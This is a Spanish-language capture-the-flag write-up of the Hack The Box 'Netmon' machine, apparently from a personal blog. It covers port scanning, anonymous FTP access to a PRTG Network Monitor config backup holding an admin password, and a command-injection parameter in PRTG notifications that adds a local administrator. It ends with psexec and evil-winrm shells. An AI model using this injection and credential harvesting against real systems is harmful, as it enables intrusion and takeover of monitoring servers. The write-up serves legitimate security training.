---
title: Hack The Box Netmon
author: k4miyo
date: 2022-02-06
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Windows]
tags: [Windows, Powershell, File Misconfiguration]
ping: true
---

## Netmon
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.152.

```bash
❯ ping -c 1 10.10.10.152
PING 10.10.10.152 (10.10.10.152) 56(84) bytes of data.
64 bytes from 10.10.10.152: icmp_seq=1 ttl=127 time=137 ms

--- 10.10.10.152 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 136.924/136.924/136.924/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.152 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-06 18:09 CST
Initiating SYN Stealth Scan at 18:09
Scanning 10.10.10.152 [65535 ports]
Discovered open port 139/tcp on 10.10.10.152
Discovered open port 445/tcp on 10.10.10.152
Discovered open port 135/tcp on 10.10.10.152
Discovered open port 21/tcp on 10.10.10.152
Discovered open port 80/tcp on 10.10.10.152
Discovered open port 49669/tcp on 10.10.10.152
Discovered open port 5985/tcp on 10.10.10.152
Discovered open port 49667/tcp on 10.10.10.152
Discovered open port 49664/tcp on 10.10.10.152
Discovered open port 49666/tcp on 10.10.10.152
Discovered open port 49665/tcp on 10.10.10.152
Discovered open port 49668/tcp on 10.10.10.152
Discovered open port 47001/tcp on 10.10.10.152
Completed SYN Stealth Scan at 18:10, 16.59s elapsed (65535 total ports)
Nmap scan report for 10.10.10.152
Host is up, received user-set (0.14s latency).
Scanned at 2022-02-06 18:09:48 CST for 17s
Not shown: 65197 closed tcp ports (reset), 325 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 127
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.70 seconds
           Raw packets sent: 81004 (3.564MB) | Rcvd: 67859 (2.714MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.152
   5   │     [*] Open ports: 21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-06 18:10 CST
Nmap scan report for 10.10.10.152                
Host is up (0.14s latency).                                     
                                                                
PORT      STATE SERVICE      VERSION          
21/tcp    open  ftp          Microsoft ftpd     
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub                                                                                 
| 07-16-16  08:18AM       <DIR>          PerfLogs    
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users            
|_02-25-19  10:49PM       <DIR>          Windows  
| ftp-syst:                                                     
|_  SYST: Windows_NT                                                                                                             
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm        
|_http-server-header: PRTG/18.1.37.13946                                                                                         
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found                                         
|_http-server-header: Microsoft-HTTPAPI/2.0       
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found                                                                                                          
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-02-07T00:11:39
|_  start_date: 2022-02-07T00:08:23
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.54 seconds
```

Vemos el puerto 21 abierto, así que vamos a tratar de ingresar como el usuario **anonymous**:

```bash
❯ ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:k4miyo): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-02-19  11:18PM                 1024 .rnd
02-25-19  09:15PM       <DIR>          inetpub
07-16-16  08:18AM       <DIR>          PerfLogs
02-25-19  09:56PM       <DIR>          Program Files
02-02-19  11:28PM       <DIR>          Program Files (x86)
02-03-19  07:08AM       <DIR>          Users
02-25-19  10:49PM       <DIR>          Windows
226 Transfer complete.
ftp>
```

Tenemos acceso y vemos una estructura de lo que encontraría con `C:\`, com son varios recursos, vamos hacer uso de la herramienta `curlftpfs` para crearnos una montura.

```bash
❯ mkdir /mnt/ftp
❯ curlftpfs anonymous:loquesea@10.10.10.152 /mnt/ftp/
```

Ahora ya podemos ingresar más cómodos a la montura y visualizar los recursos de la máquina víctima. Pero para no buscar recursos en todos lados; vemos que también se encuentra abierto el puerto 80, así que antes de ver el contenido vía web, ocuparemos `whatweb`.

```bash
❯ whatweb http://10.10.10.152/
http://10.10.10.152/ [302 Found] Country[RESERVED][ZZ], HTTPServer[PRTG/18.1.37.13946], IP[10.10.10.152], PRTG-Network-Monitor[18.1.37.13946,PRTG], RedirectLocation[/index.htm], UncommonHeaders[x-content-type-options], X-XSS-Protection[1; mode=block]
ERROR Opening: http://10.10.10.152/index.htm - incorrect header check
```

No tenemos nada interesante, así que ahora si visualizamos el contenido vía web.

![](/assets/images/htb-netmon/netmon-web.png)

Nos enfrentamos antes un **PRTG Network Monitor** e igual dicha tecnología presenta credenciales default, que buscando un poco las credenciales son **prtgadmin : prtgadmin**; sin embargo, vemos que no podemos ingresar. Pensando un poco como atacantes, podríamos deducir que existe un posible archivos de configuración en donde se guarden credenciales en texto claro y tenemos una vía de acceso de esos recursos por FTP. 

Investigando un poco, encontramos el recurso [paessler.com](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data) y vemos que la posibles rutas donde se encuentra instalado el software de **PRTG Network Monitor** serian:

- %programfiles%\PRTG Network Monitor
- %programfiles(x86)%\PRTG Network Monitor
- %programdata%\Paessler\PRTG Network Monitor
- %ALLUSERSPROFILE%\Application data\Paessler\PRTG Network Monitor

Vamos a validarlas en la montura que tenemos:

```bash
❯ cd /mnt/ftp
❯ ll
d--------- root root   0 B  Sun Nov 20 21:46:00 2016  $RECYCLE.BIN
d--------- root root   0 B  Sun Feb  3 07:05:00 2019  Documents and Settings
d--------- root root   0 B  Mon Feb 25 21:15:00 2019  inetpub
d--------- root root   0 B  Sat Jul 16 09:18:00 2016  PerfLogs
d--------- root root   0 B  Mon Feb 25 21:56:00 2019  Program Files
d--------- root root   0 B  Sat Feb  2 23:28:00 2019  Program Files (x86)
d--------- root root   0 B  Wed Dec 15 09:40:00 2021  ProgramData
d--------- root root   0 B  Sun Feb  3 07:05:00 2019  Recovery
d--------- root root   0 B  Sun Feb  3 07:04:00 2019  System Volume Information
d--------- root root   0 B  Sun Feb  3 07:08:00 2019  Users
d--------- root root   0 B  Mon Feb 25 22:49:00 2019  Windows
.--------- root root 380 KB Sun Nov 20 20:59:00 2016  bootmgr
.--------- root root   1 B  Sat Jul 16 09:10:00 2016  BOOTNXT
.--------- root root 704 MB Sun Feb  6 19:08:00 2022  pagefile.sys
```

Vemos la carpeta **ProgramData** que corresponde al tercer punto de las posibles rutas donde se encuentra instalado el programa; así que vamos por ahí.

```bash
❯ cd ProgramData
❯ ll
d--------- root root 0 B Sun Feb  3 07:05:00 2019  Application Data
d--------- root root 0 B Wed Dec 15 09:40:00 2021  Corefig
d--------- root root 0 B Sun Feb  3 07:05:00 2019  Desktop
d--------- root root 0 B Sun Feb  3 07:05:00 2019  Documents
d--------- root root 0 B Sat Feb  2 23:15:00 2019  Licenses
d--------- root root 0 B Sun Nov 20 21:36:00 2016  Microsoft
d--------- root root 0 B Sat Feb  2 23:18:00 2019  Paessler
d--------- root root 0 B Sun Feb  3 07:05:00 2019  regid.1991-06.com.microsoft
d--------- root root 0 B Sat Jul 16 09:18:00 2016  SoftwareDistribution
d--------- root root 0 B Sun Feb  3 07:05:00 2019  Start Menu
d--------- root root 0 B Sat Feb  2 23:15:00 2019  TEMP
d--------- root root 0 B Sun Feb  3 07:05:00 2019  Templates
d--------- root root 0 B Sun Nov 20 21:19:00 2016  USOPrivate
d--------- root root 0 B Sun Nov 20 21:19:00 2016  USOShared
d--------- root root 0 B Mon Feb 25 21:56:00 2019  VMware
❯ cd Paessler
❯ ll
d--------- root root 0 B Sun Feb  6 19:09:00 2022  PRTG Network Monitor
```

Vamos a ver que archivos se encuentran en **PRTG Network Monitor**:

```bash
❯ cd "PRTG Network Monitor"
❯ ll
d--------- root root   0 B  Wed Dec 15 07:23:00 2021  Configuration Auto-Backups
d--------- root root   0 B  Sun Feb  6 19:09:00 2022  Log Database
d--------- root root   0 B  Sat Feb  2 23:18:00 2019  Logs (Debug)
d--------- root root   0 B  Sat Feb  2 23:18:00 2019  Logs (Sensors)
d--------- root root   0 B  Sat Feb  2 23:18:00 2019  Logs (System)
d--------- root root   0 B  Sun Feb  6 19:09:00 2022  Logs (Web Server)
d--------- root root   0 B  Wed Dec 15 07:19:00 2021  Monitoring Database
d--------- root root   0 B  Mon Feb 25 22:00:00 2019  Report PDFs
d--------- root root   0 B  Sat Feb  2 23:18:00 2019  System Information Database
d--------- root root   0 B  Sat Feb  2 23:40:00 2019  Ticket Database
d--------- root root   0 B  Sat Feb  2 23:18:00 2019  ToDo Database
.--------- root root 1.1 MB Mon Feb 25 21:54:00 2019  PRTG Configuration.dat
.--------- root root 1.1 MB Mon Feb 25 21:54:00 2019  PRTG Configuration.old
.--------- root root 1.1 MB Sat Jul 14 03:13:00 2018  PRTG Configuration.old.bak
.--------- root root 1.6 MB Sun Feb  6 19:09:00 2022  PRTG Graph Data Cache.dat
```

Encontramos unos archivos de configuración **PRTG Configuration**, los cuales podrían contener configuración de la tecnología, como su nombre lo indica, y tal vez encontraríamos credenciales de acceso. 

```bash
❯ file PRTG*
PRTG Configuration.dat:     XML 1.0 document, UTF-8 Unicode (with BOM) text, with very long lines, with CRLF line terminators
PRTG Configuration.old:     XML 1.0 document, UTF-8 Unicode (with BOM) text, with very long lines, with CRLF line terminators
PRTG Configuration.old.bak: XML 1.0 document, UTF-8 Unicode (with BOM) text, with very long lines, with CRLF line terminators
PRTG Graph Data Cache.dat:  data
```

Uno que ya nos debería llamar un poco la atención sería el que termina en `.bak` ya que hace referencia a un backup y si revisamos su contenido, encontramos lo siguiente:

```bash
❯ cat "PRTG Configuration.old.bak" | less -S
...
<dbpassword>
<!-- User: prtgadmin -->
PrTg@dmin2018
</dbpassword>
...
```

Tenemos las credenciales **prtgadmin : PrTg@dmin2018**; podríamos tratar de probarlas en el panel de login, pero vemos que no podemos acceder. Pensando un poco, dichas credenciales las obtuvimos del archivo `PRTG Configuration.old.bak`, lo que nos hace referencia que son antiguas y ¿si la contraseña sigue el mismo principio cambiando el año? Podríamos tratar de ingresar **PrTg@dmin2019**, **PrTg@dmin2020**, y así sucesivamente.

![](/assets/images/htb-netmon/netmon-web1.png)

Las credenciales de acceso son **prtgadmin : PrTg@dmin2019** y ya hemos ingresado al sistema. Nos enfrentamos ante un PRTG Network Monitor de versión 18.1.37.13946, entonces vamos a tratar de buscar algún exploit público que nos ayude a ingresar al sistema.

```bash
❯ searchsploit prtg network monitor
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                           | windows/webapps/46527.sh
PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS                                          | windows/webapps/49156.txt
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)                       | windows_x86/dos/44500.py
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Vemos uno `windows/webapps/46527.sh`, así que tratamos de ver que hace. Básicamente tenemos que crear una notificación en la parte de **Setup > Notifications**, hacemos clicp en el símbol de **+** en la parte superior derecha y luego click en **Add new notification**.

![](/assets/images/htb-netmon/netmon-web2.png)

Nos vamos hasta abajo y habilitamos **Execute Program** llenando los siguientes campos dela siguiente forma:

- **Program File**: Demo exe notification - outfile.ps1
- **Parameter**: C:\Users\Public\tester.txt; el_comando_que_queremos_ejecutar 

De acuerdo con el exploit, nos creamos un usuario a nivel de sistema y de paso lo agregamos al grupo **Administrators**. Si podemos hacer esto, significa que quien corre el programa es un usuario administrador.

Por lo tanto ponemos `C:\Users\Public\tester.txt; net user kamiyo k4miyo123$! /add; net localgroups Administrators kamiyo /add`.

![](/assets/images/htb-netmon/netmon-web4.png)

Para ejecutar la notificación, nos vamos a la que hemos creado y damos click en el icono de un papel y un lapiz y nos aparecen varias opciones; seleccionamos aquella que parece una campanita. 

![](/assets/images/htb-netmon/netmon-web3.png)

Validamos con `crackmapexec smb` si nuestro usuario fue creado:

```bash
❯ crackmapexec smb 10.10.10.152 -u 'kamiyo' -p 'k4miyo123$!'
SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.10.10.152    445    NETMON           [+] netmon\kamiyo:k4miyo123$! (Pwn3d!)
```

Fue creado y a parte tenemos posiblidad de ingresar a la máquina con `impacket-psexec`. En caso que no queramos usar `psexec` podríamos tratar de agregar nuestro usuario al grupo **Remote Management Users** y conectarnos a la máquina con `evil-winrm` ya que se encuentra abierto el puerto 5985.

```bash
❯ impacket-psexec WORKGROUP/kamiyo:k4miyo123\$\!@10.10.10.152
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file PrIscOHa.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service FyEk on 10.10.10.152.....
[*] Starting service FyEk.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

```bash
❯ evil-winrm -i 10.10.10.152 -u 'kamiyo' -p 'k4miyo123$!'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\kamiyo\Documents> whoami
netmon\kamiyo
*Evil-WinRM* PS C:\Users\kamiyo\Documents>
```

Ya nos encontramos dentro de la máquina como `nt authority\system` y podemos visualizar las flags (user.txt y root.txt).
